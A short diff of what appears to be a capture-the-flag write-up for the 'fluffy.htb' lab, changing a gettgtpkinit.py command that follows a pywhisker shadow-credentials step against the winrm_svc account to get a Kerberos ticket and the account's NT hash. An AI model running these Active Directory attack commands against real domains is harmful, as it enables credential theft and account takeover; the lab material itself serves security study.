@@ -15,7 +15,7 @@ pywhisker.py -d "<DOMAIN" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --act
 
 then we need to get TGT with the outputted certs:
 ```bash
-gettgtpkinit.py -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
+gettgtpkinit.py -cert-pfx $CERT.PFX -pfx-pass $PASS fluffy.htb/winrm_svc winrm_svc.ccache
 
 ```
 this command will get us AS-REP encryption key. This is the **user's NT hash** derived from the AS-REP response.
